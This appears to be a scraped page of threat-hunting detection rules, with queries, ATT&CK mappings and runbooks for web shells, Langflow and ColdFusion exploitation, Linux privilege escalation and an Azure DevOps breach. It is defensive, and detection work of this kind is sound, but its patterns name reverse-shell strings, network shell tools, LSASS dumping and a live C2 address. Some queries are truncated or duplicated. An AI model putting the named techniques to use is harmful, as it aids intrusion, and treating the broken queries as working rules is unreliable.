ImFileEvent | where TimeGenerated > ago(7d) | where EventType == "FileCreated" | where TargetFileName endswith ".php" | where TargetFilePath has "com_pagebuilderck" or TargetFileName =~ "bhup.php" | project TimeGenerated, DvcHostname, TargetFilePath, TargetFileName, ActingProcessName, ActingProcessCommandLine, ActorUsername | order by TimeGenerated desc

Interaction with Page Builder CK bhup.php uploader web shell (_upl POST) AICommand & Control Medium
Hunts web requests to PHP files under /media/com_pagebuilderck/ — i.e. operator interaction with the planted bhup.php uploader shell that is keyed on the $_POST['_upl'] field. Complements the file-drop detection by catching use of the shell from web/proxy telemetry. Rationale: Page Builder CK serves fonts/CSS/images from /media/com_pagebuilderck — PHP execution requests there are anomalous and match the bhup.php uploader shell path and its _upl POST handler described by the article and mySites.guru. Cross-checked against: • https://mysites.guru/blog/pagebuilderck-unauthenticated-file-upload-rce/ • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html
ATT&CKT1505.003 T1071.001
Data sourcesWeb
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate dynamic font/asset generator shipping a PHP endpoint under the extension media folder
  • Security scanner requesting known-shell filenames as a compromise check
  • Uptime/monitoring probe configured against a PHP path
  • Cached/CDN revalidation requests replaying a URL
Response runbook
1) Triage: identify the specific PHP filename requested and whether it exists on disk; a POST with an _upl body parameter and a 200 response is high-signal. 2) Contain: block the source IP, remove the file, and rotate any credentials reachable from the web process. 3) Hunt: correlate the requesting IP across the SP Page Builder and ColdFusion detections, and review file-create telemetry for the moment the PHP file first appeared to establish the initial upload vector.

Langflow cross-tenant IDOR + RCE campaign from 45.207.216.55 (CVE-2026-55255 / CVE-2026-33017) AIExploitation High
Detects the Sysdig-documented lone operator (45.207.216.55) hitting Langflow API routes — /api/v1/flows enumeration then /api/v1/responses IDOR replay — chained with CVE-2026-33017 RCE to steal LLM and AWS keys. Anchored on the confirmed campaign IP and the exact abused endpoints. Rationale: Anchored on the confirmed campaign IP 45.207.216.55 and the exact abused routes /api/v1/flows (enumeration) and /api/v1/responses (IDOR) surfaced by Sysdig; the IP is a corroborated second-source IOC so the web/network match is high-fidelity. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://github.com/advisories/GHSA-qrpv-q767-xqq2 • https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-prioritize-patching-langflow-auth-bypass-flaw/
ATT&CKT1190 T1552 T1213
Data sourcesWeb
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate Langflow user calling /api/v1/flows and /api/v1/responses for their own flows (endpoint-only match, not the IP)
  • Internal load balancer/health check hitting Langflow API routes
  • Authorized red-team using a rented VPS that happens to share the /24
  • Threat-intel enrichment tooling connecting to the IP for reputation checks
Response runbook
1) Triage: confirm whether traffic involved the named IP (definitive) or only the API paths (needs review); for path-only hits, check whether the flow ID requested at /api/v1/responses belongs to a different tenant than the caller. 2) Contain: block 45.207.216.55, patch Langflow, and immediately rotate all LLM provider keys and AWS keys stored in Langflow flows/environment. 3) Hunt: review outbound connections from the Langflow host (see the 45.207.216.55:8084/slt beacon detection) and audit CloudTrail for use of any AWS keys that lived in Langflow.

Langflow second-stage downloader C2 beacon to 45.207.216.55:8084/slt AICommand & Control Medium
Detects outbound connections from a compromised Langflow host to the second-stage downloader C2 at 45.207.216.55 on TCP/8084 (URL /slt) following CVE-2026-33017 RCE. High-fidelity fixed IP+port IOC consistent with botnet/cryptojacking staging. Rationale: Fixed IOC IP+port (45.207.216.55:8084) with URL path /slt from the article's pre-extracted IOCs and corroborated by Sysdig as the outbound C2/staging endpoint; any host reaching it is almost certainly compromised. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel sandbox/detonation environment deliberately connecting to the C2
  • Security researcher pulling the second-stage payload for analysis
  • Firewall/proxy egress-test tooling probing the IOC
  • Honeypot or deception host emulating the callback
Response runbook
1) Triage: identify the initiating process on the beaconing host — a Langflow/python process reaching an external IP:8084 is post-exploitation. Capture any payload fetched from /slt. 2) Contain: isolate the host, block 45.207.216.55 egress network-wide, and preserve memory/disk for the downloader. 3) Hunt: scan for cryptominer or botnet artifacts (unexpected high CPU, XMRig-like processes), rotate credentials on the host, and search other hosts for the same 8084/slt beacon.

ImNetworkSession | where TimeGenerated > ago(30d) | where DstIpAddr == "45.207.216.55" and DstPortNumber == 8084 | project TimeGenerated, SrcIpAddr, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkBytes, NetworkApplicationProtocol, DvcAction | order by TimeGenerated desc

Adobe ColdFusion path-traversal exploitation from 103.207.14.220 (CVE-2026-48282) AIExploitation Medium
Detects inbound web/network traffic from the KEVIntel-reported exploitation IP 103.207.14.220 (geolocated to India) that attempted CVE-2026-48282 path-traversal RCE within hours of disclosure. Anchored on the corroborated attacker IP against ColdFusion/web servers. Rationale: Anchored on the specific exploitation IP 103.207.14.220 attributed by KEVIntel founder Ryan Dewhurst in the article; the article gives no ColdFusion path string, so the corroborated IOC IP is the highest-fidelity available anchor. Cross-checked against: • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html
ATT&CKT1190 T1083
Data sourcesWeb
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • The /24 (103.207.14.0/24) later reassigned to a benign hosting customer
  • Shared VPS where the same IP is used by an unrelated legitimate service
  • Threat-intel scanner correlating against the IOC
  • ISP CGNAT reuse producing benign traffic from the address
Response runbook
1) Triage: confirm the destination is an internet-facing ColdFusion server and review the src's request paths for traversal sequences (../, %2e%2e) or /CFIDE access; check response codes for successful reads/writes. 2) Contain: block 103.207.14.220, apply the Adobe ColdFusion update for CVE-2026-48282, and inspect the web root for newly written files. 3) Hunt: review ColdFusion process (coldfusion.exe/jrun/java) for spawned shells and search for any dropped web shells or scheduled tasks created after the first request from this IP.

Exposure hunt: unpatched Adobe ColdFusion / Joomla Page Builder / Langflow (4 KEV CVEs) AIReconnaissance High
Discovery hunt that inventories hosts carrying the four newly KEV-listed CVEs (CVE-2026-48282, CVE-2026-56290, CVE-2026-55255, CVE-2026-48908) so exposure can be remediated ahead of the July 10, 2026 FCEB deadline. Not attacker behaviour — asset triage for the KEV additions. Rationale: Uses the four exact CVE identifiers CISA added to KEV; matching them against TVM/vuln inventory is a precise, non-behavioural exposure query with essentially no false positives. Cross-checked against: • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html • https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-prioritize-patching-langflow-auth-bypass-flaw/
ATT&CKT1518.001 T1518
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Vuln scanner has stale data flagging an already-patched host until next scan
  • Version-only detection matching a backported/vendor-patched build
  • Non-internet-facing dev instances flagged with equal severity to exposed prod
  • Duplicate device entries from re-imaged hosts inflating counts
Response runbook
1) Triage: rank matched hosts by internet exposure (IsInternetFacing) and severity; internet-facing ColdFusion/Joomla/Langflow are top priority. 2) Contain: patch to fixed versions (ColdFusion update for CVE-2026-48282, Page Builder CK >=3.6.0, SP Page Builder >=6.6.2, patched Langflow) before the July 10 deadline; WAF-virtual-patch where immediate patching isn't possible. 3) Hunt: for each exposed host, run the corresponding exploitation detections (endpoint web-upload, web shell drop, C2 beacon) retroactively to confirm none were already compromised.

Post-exploitation shell spawned by ColdFusion / Joomla / Langflow web process AIActions on Objectives Medium
Hunts web-application server processes (ColdFusion, Apache/PHP-FPM for Joomla, Python/uvicorn for Langflow) spawning command interpreters or download tools — the execution stage after exploiting these four KEV flaws. Scopes to the specific server processes fronting the vulnerable apps. Rationale: Scopes the classic web-process-spawns-shell pattern to the exact server processes fronting the four vulnerable products named in the article (ColdFusion, Joomla PHP stack, Langflow Python stack), making it article-specific rather than a generic template. Cross-checked against: • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
ATT&CKT1059 T1190 T1505.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Langflow/Python legitimately shelling out to run a tool inside a flow or component
  • PHP application invoking system() for image processing (ImageMagick/ffmpeg) or cron-style tasks
  • ColdFusion scheduled task or CFEXECUTE running an admin script
  • Deployment/entrypoint scripts where the web process legitimately spawns sh at container start
  • Monitoring agents invoking whoami/curl for health checks under the app account
Suppression filter
| where ProcessCommandLine has_any ("http://","https://","-c ","/dev/tcp/","base64","-enc","bash -i") or FileName in~ ("nc","ncat","whoami")
Response runbook
1) Triage: examine the child command line — reverse-shell one-liners, curl/wget to external IPs, or base64 blobs are high-signal; benign app calls are usually to local tools with fixed args. 2) Contain: isolate the host, kill the process tree, and block any external IPs contacted; capture the web process's recent requests to find the exploited route. 3) Hunt: check for dropped web shells (bhup.php and stray .php), new Super User/local accounts, and the 45.207.216.55:8084 beacon to establish the full chain.
DeviceProcessEvents | where Timestamp > ago(7d) | where InitiatingProcessFileName in~ ("coldfusion.exe","jrun.exe","java.exe","php-fpm","php","php.exe","httpd","apache2","nginx","python3","uvicorn","gunicorn") | where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","bash","sh","dash","curl","wget","whoami","nc","ncat") | where AccountName !endswith "$" | project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath | order by Timestamp desc
ImProcessCreate | where TimeGenerated > ago(7d) | where ParentProcessName has_any ("coldfusion.exe","jrun.exe","java.exe","php-fpm","httpd","apache2","nginx","python3","uvicorn","gunicorn") | where ActingProcessName has_any ("cmd.exe","powershell.exe","pwsh.exe","bash","sh","dash","curl","wget","whoami","nc","ncat") | project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine | order by TimeGenerated desc

Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

15-Year-Old GhostLock Flaw Enables Root and Container Escape on Most Linux Distros

The Hacker News
2026-07-08 8 use cases 3 techniques 6 kill-chain phases detected

Researchers at&nbsp;Nebula Security&nbsp;have disclosed GhostLock (CVE-2026-43499), a 15-year-old Linux kernel flaw that lets any logged-in user take full&nbsp;root&nbsp;control of a machine that has not been patched. The vulnerable code has shipped by default in essentially every mainstream distribution since 2011. The flaw needs no special permission, no unusual settings, and no network

CVEsCVE-2026-43499 CVE-2026-10702 CVE-2026-46242 CVE-2026-31431 CVE-2026-53166
ATT&CKT1190 T1486 T1555.003

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Host exposure to GhostLock IonStack kernel-to-root chain CVEs (CVE-2026-43499 et al.) · [LLM] Linux unprivileged process escalates to root without sudo/su/pkexec (kernel-LPE / container-escape shape)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Host exposure to GhostLock IonStack kernel-to-root chain CVEs (CVE-2026-43499 et al.) AIExploitation High
Surfaces every managed asset whose vulnerability inventory reports exposure to the GhostLock/IonStack chain and its sibling 2026 Linux LPE CVEs, so multi-tenant/cloud/CI hosts (where a local foothold is most likely) can be patched first. Article-specific because it keys on the exact CVE identifiers Nebula disclosed and the fix-regression CVE the article warns you must also clear. Rationale: Uses the five concrete CVE IDs named in the article/pre-extracted IOCs (GhostLock CVE-2026-43499, the Firefox first-half CVE-2026-10702, sibling Bad Epoll CVE-2026-46242, KEV-listed Copy Fail CVE-2026-31431, and the fix-regression CVE-2026-53166). TVM inventory match is deterministic; corroborated fixed-kernel version (Linux 7.1) confirms which builds clear it. Cross-checked against: • https://nebusec.ai/research/ionstack-part-2/ • https://securityonline.info/ghostlock-cve-2026-43499/ • https://nvd.nist.gov/vuln/detail/CVE-2026-43499 • https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/
ATT&CKT1068 T1611
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Host already patched to fixed kernel but TVM inventory snapshot is stale (rescan pending)
  • Kernel live-patching (kpatch/ksplice/kernelcare) applied at runtime while the on-disk package version still reads vulnerable
  • Ephemeral CI/build containers flagged that are torn down within minutes and never expose a persistent foothold
  • CVE-2026-10702 reported against Firefox on single-user endpoints that are lower priority than shared/multi-tenant Linux hosts
  • Air-gapped or single-tenant hosts where the 'already logged in' precondition is low-risk
Response runbook
1) Triage: rank hits by exposure — shared/multi-tenant Linux hosts, cloud servers, container hosts and CI runners first (the footholds the article calls out); confirm the running kernel via OSVersion, not just package metadata (live-patch can mask it). 2) Contain: schedule/deploy the current distribution kernel (Linux 7.1+ / vendor-fixed build that also clears the CVE-2026-53166 regression) and reboot; where patching lags, enable RANDOMIZE_KSTACK_OFFSET and STATIC_USERMODE_HELPER as interim hardening. 3) Hunt: on any host that stayed vulnerable and internet-adjacent, run the companion non-root-to-root behavioral hunt and review for post-exploitation persistence (new root cron, added users, SSH authorized_keys).

| summarize arg_max(TimeGenerated, *) by DeviceId, CveId
| project TimeGenerated, DeviceName, OSPlatform, OSVersion, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| sort by CveId asc, DeviceName asc
Linux unprivileged process escalates to root without sudo/su/pkexec (kernel-LPE / container-escape shape) AIExploitation Medium
Hunts the article's core outcome: a non-root user's process yielding a child running as root without transiting a legitimate setuid escalation helper, the observable signature of a kernel use-after-free exploit like GhostLock that 'enables root and container escape.' Not tied to a phishing/LOLBin template; anchors on the unprivileged-to-root process transition on Linux endpoints. Rationale: Grounded in the article's central, repeatedly-stated claim ('enables root and container escape on most Linux distros' from 'any local program'). The non-root-parent-to-root-child transition without a setuid helper is the observable residue of a kernel UAF LPE; escalation/setuid binaries are excluded to raise fidelity. Datadog left empty because the listed linux.auditd normalized fields do not cleanly expose the euid/auid transition this detection needs. Cross-checked against: • https://nebusec.ai/research/ionstack-part-2/ • https://securityonline.info/ghostlock-cve-2026-43499/ • https://thehackernews.com/2026/05/cisa-adds-actively-exploited-linux-root.html
ATT&CKT1068 T1611
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • User-invoked setuid-root binaries not in the exclusion list (e.g. Xorg, exim, at, dbus helpers, vendor VPN/backup agents) reporting effective root
  • Container runtimes (runc, crun, containerd-shim, docker-init) launching root workloads whose immediate parent is a non-root orchestrator process
  • User crontab entries or systemd user units configured to execute a root helper
  • Interactive 'sudo -i' / policy-kit GUI prompts whose telemetry attributes the child to the invoking user rather than the helper
  • Configuration-management agents (Ansible/Salt/Puppet) escalating via a custom become-method not covered by su/sudo/pkexec
Suppression filter
| where not (ParentProcess in~ ("ansible","salt-minion","puppet","chef-client","dockerd","docker-init","crun") or ChildProcess in~ ("Xorg","exim","at","dbus-daemon-launch-helper","vpnagentd"))
Response runbook
1) Triage: pull the full parent->child tree and both command lines; confirm the child genuinely ran as uid 0 and the parent was an ordinary user process (not a setuid helper), and cross-check whether the host is still exposed to the GhostLock chain via the companion TVM hunt. 2) Contain: isolate the host, capture a memory/disk snapshot before reboot, and terminate the root-context shell/process; rotate any credentials or keys reachable from that host. 3) Hunt: sweep the fleet for the same non-root->root pattern, and on confirmed hosts look for follow-on persistence (new root cron, added /etc/passwd or sudoers entries, injected SSH authorized_keys) and container-escape indicators (containerized PID writing to host mount paths).
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName =~ "root"
| where isnotempty(InitiatingProcessAccountName) and InitiatingProcessAccountName !~ "root"
| where InitiatingProcessFileName !in~ ("sudo","su","pkexec","sudoedit","doas","gksudo","gksu","runuser","login","sshd","systemd","init","runc","containerd-shim","crond","cron","polkitd","lightdm","gdm","sddm")
| where FileName !in~ ("sudo","su","pkexec","sudoedit","doas","passwd","chsh","chfn","gpasswd","newgrp","mount","umount","fusermount","fusermount3","ping","ping6","ntfs-3g","pmount","mount.nfs")
| project Timestamp, DeviceName, RanAsUser = AccountName, ParentUser = InitiatingProcessAccountName, ParentProcess = InitiatingProcessFileName, ParentCmd = InitiatingProcessCommandLine, ChildProcess = FileName, ChildCmd = ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where TargetUsername =~ "root"
| where isnotempty(ActorUsername) and ActorUsername !~ "root"
| where not(ActingProcessName has_any ("sudo","su","pkexec","sudoedit","doas","runuser","login","sshd","systemd","runc","containerd-shim","polkitd","crond"))
| where not(TargetProcessName has_any ("sudo","su","pkexec","sudoedit","doas","passwd","chsh","chfn","gpasswd","newgrp","mount","umount","fusermount","ping","ntfs-3g"))
| project TimeGenerated, DvcHostname, ActorUsername, TargetUsername, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc
#event_simpleName=ProcessRollup2 UserName=root
| ParentBaseFileName!=/^(sudo|su|pkexec|sudoedit|doas|runuser|login|sshd|systemd|init|runc|containerd-shim.*|cron|crond|polkitd)$/i
| ImageFileName=/\/(bash|dash|sh|zsh|ksh|python[0-9.]*|perl|ruby|ncat|nc|busybox)$/i
| table([_time, aid, ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])

description: |

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine

DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-43499", "CVE-2026-10702", "CVE-2026-46242", "CVE-2026-31431", "CVE-2026-53166")

| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-43499", "CVE-2026-10702", "CVE-2026-46242", "CVE-2026-31431", "CVE-2026-53166")

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem

    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem

| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Actions on Objectives
Detected

Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Anomalous Azure Storage account key listing (listKeys) by first-seen caller · [LLM] Bulk Azure DevOps repository clone/download by a single identity · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Anomalous Azure Storage account key listing (listKeys) by first-seen caller AIActions on Objectives Medium
Hunts an identity enumerating Azure Storage account access keys via the ARM listKeys action from a principal/IP not seen doing so in the baseline window. Mirrors the '888' Accenture theft where Azure Storage access keys were harvested for offline data-plane access to blobs/config. Rationale: Article states 'Azure Storage access keys' were stolen; the ARM operation that exposes them is the concrete string Microsoft.Storage/storageAccounts/listKeys/action, and a first-seen-caller anti-join surfaces harvest activity without an IOC. Cross-checked against Microsoft's own Azure-Sentinel Anomalous_Listing_Of_Storage_Keys hunting query. Cross-checked against: • https://www.bleepingcomputer.com/news/security/accenture-confirms-breach-after-hacker-offers-stolen-data-for-sale/ • https://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Azure%20Activity/Hunting%20Queries/Anomalous_Listing_Of_Storage_Keys.yaml • https://orca.security/resources/blog/azure-shared-key-authorization-exploitation/
ATT&CKT1528 T1580
Data sourcesChange.All_Changes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Terraform/Bicep IaC deployments or CI service principals that legitimately call listKeys during storage provisioning
  • Backup/monitoring tooling (e.g. Veeam, storage-explorer, azcopy setup) rotating or reading keys
  • A newly onboarded platform-engineering account performing first-time storage administration
  • Azure Policy or Defender for Cloud remediation runbooks that enumerate keys
  • Break-glass admin performing genuine incident cleanup after this very breach
Suppression filter
| where Caller !endswith "@yourtenant.onmicrosoft.com" or Caller has "#EXT#"   // keep external/guest and non-standard callers; append a known-automation SPN allow-list here
Response runbook
1) Triage: resolve Caller to a human vs service principal; check whether the SourceIPs and ASN match known corporate/CI egress, and whether the same Caller has recent risky Entra sign-ins. 2) Contain: if the caller is unexpected, rotate the affected storage account keys immediately (both key1/key2) and disable/rotate the caller's credentials or the SPN secret; enable Shared Key access restrictions where possible. 3) Hunt: pivot on the storage accounts named in _ResourceId for subsequent data-plane blob reads (StorageBlobLogs) from IPs differing from the management-plane caller, and correlate the same Caller against Azure DevOps access and PAT creation in the same window.
let lookback = 14d;
let recent = 1d;
let Baseline = AzureActivity
| where TimeGenerated between (ago(lookback) .. ago(recent))
| where OperationNameValue =~ "Microsoft.Storage/storageAccounts/listKeys/action"
| where ActivityStatusValue in ("Success","Succeeded")
| summarize by Caller;
AzureActivity
| where TimeGenerated > ago(recent)
| where OperationNameValue =~ "Microsoft.Storage/storageAccounts/listKeys/action"
| where ActivityStatusValue in ("Success","Succeeded")
| join kind=leftanti Baseline on Caller
| summarize KeyListOps = count(), StorageAccounts = dcount(_ResourceId), SourceIPs = make_set(CallerIpAddress, 10), FirstSeen = min(TimeGenerated) by Caller
| where KeyListOps >= 3     // 3 = strips single benign key reads; tune to your automation baseline
| order by KeyListOps desc
source:azure.activity_logs @operationName.value:Microsoft.Storage/storageAccounts/listKeys/action @properties.activityStatusValue:Success
CLOUD
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count as key_list_ops, values(All_Changes.object) as storage_accounts, values(All_Changes.src) as src_ips, min(_time) as firstSeen from datamodel=Change.All_Changes where All_Changes.command="Microsoft.Storage/storageAccounts/listKeys/action" All_Changes.status IN ("success","Succeeded") by All_Changes.user _time span=1d | `drop_dm_object_name(All_Changes)` | where key_list_ops >= 3 | sort - key_list_ops
| tstats summariesonly=false count as key_list_ops, values(All_Changes.object) as storage_accounts, values(All_Changes.src) as src_ips, min(_time) as firstSeen from datamodel=Change.All_Changes where All_Changes.command="Microsoft.Storage/storageAccounts/listKeys/action" All_Changes.status IN ("success","Succeeded") by All_Changes.user _time span=1d | `drop_dm_object_name(All_Changes)` | where key_list_ops >= 3 | sort - key_list_ops
Bulk Azure DevOps repository clone/download by a single identity AIActions on Objectives Low
Hunts a single identity performing a high volume of Azure DevOps repository clone/download/Git-read operations via Defender for Cloud Apps activity, matching the '888' actor's full clone of the internal 'AtriasTalentAcademy' repo to stage ~35GB of source for exfiltration. Rationale: Article's supporting screenshot shows the actor cloning the Azure DevOps repo '121123_AtriasTalentAcademy'; Defender for Cloud Apps is the telemetry that captures connected-app (Azure DevOps) repository read/clone activity, and a per-identity volume threshold isolates bulk staging from normal dev pulls. Microsoft confirms clone is now logged as an access event. Cross-checked against: • https://www.bleepingcomputer.com/news/security/accenture-confirms-breach-after-hacker-offers-stolen-data-for-sale/ • https://learn.microsoft.com/en-us/azure/devops/release-notes/roadmap/track-repo-cloning • https://www.technadu.com/accenture-data-allegedly-listed-for-sale-on-hacking-forum-35gb-source-code-claimed-stolen/630523/
ATT&CKT1213.003 T1213
Data sources
Expected false positives — model-assessed, tune to your environment
  • CI/CD build agents or self-hosted pipeline runners cloning many repos every build cycle
  • A developer performing a fresh workstation setup and cloning the full team's repo set
  • Migration/backup tooling exporting repositories in bulk
  • New team lead onboarding who clones every project they were granted
  • Automated code-scanning/SAST platforms (e.g. SonarQube, Snyk) pulling all repos
Suppression filter
| where AccountDisplayName !has "Build Service" and AccountDisplayName !has "Project Collection"   // drop Azure DevOps built-in pipeline identities
Response runbook
1) Triage: confirm whether AccountObjectId belongs to a service/build identity (expected high volume) or an interactive user; review SourceIPs against corporate/CI egress and check the repos in ObjectName for sensitivity. 2) Contain: if unexpected, revoke the identity's Azure DevOps PATs and sessions, suspend the account, and restrict the org to conditional-access/allow-listed IPs. 3) Hunt: enumerate all repos the identity touched, check for accompanying PAT creation and storage-key listing by the same principal, and scan the cloned repos' history for embedded RSA/SSH keys and Azure secrets that now require rotation.
CloudAppEvents
| where Timestamp > ago(1d)
| where Application has "DevOps"
| where ActionType has_any ("Clone","Download","Git","Repository","Export")
| summarize Actions = count(), DistinctRepos = dcount(ObjectName), ActionTypes = make_set(ActionType, 20), SourceIPs = make_set(IPAddress, 10), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by AccountDisplayName, AccountObjectId
| where DistinctRepos >= 5 or Actions >= 50     // 5 repos / 50 ops = bulk staging, well above interactive dev browsing
| order by Actions desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
CloudAppEvents
| where TimeGenerated > ago(1d)
| where Application has "DevOps"
| where ActionType has_any ("Clone","Download","Git","Repository","Export")
| summarize Actions = count(), DistinctRepos = dcount(ObjectName), ActionTypes = make_set(ActionType, 20), SourceIPs = make_set(IPAddress, 10), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by AccountDisplayName, AccountObjectId
| where DistinctRepos >= 5 or Actions >= 50     // 5 repos / 50 ops = bulk staging, well above interactive dev browsing
| order by Actions desc
First-seen network origin authenticating to Azure DevOps resource AIDelivery Medium
Hunts a successful sign-in to the Azure DevOps resource from an ASN/country never previously seen for that user in the baseline window — the token/valid-account access that preceded the '888' repository clone. Complements PAT theft where the compromised identity pivots into the DevOps tenant from attacker infrastructure. Rationale: Article confirms 'Azure PAT (personal access tokens)' were stolen and used to reach an Azure DevOps repo under an accenture.com host; a per-user first-seen-ASN/country anti-join on sign-ins to the ResourceDisplayName 'Azure DevOps' catches the token-holder pivoting in from new infrastructure without needing an IOC. Cross-checked against: • https://www.bleepingcomputer.com/news/security/accenture-confirms-breach-after-hacker-offers-stolen-data-for-sale/ • https://www.technadu.com/accenture-data-allegedly-listed-for-sale-on-hacking-forum-35gb-source-code-claimed-stolen/630523/
ATT&CKT1550.001 T1078.004
Data sourcesAuthentication.Authentication
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate remote/travelling developers signing in from a new country or hotel/mobile ASN
  • Corporate VPN or SASE egress rotating to a new provider ASN not in the baseline
  • Contractors or new hires whose first DevOps sign-in has no baseline
  • Home-ISP changes or CGNAT reassignments shifting a user's ASN
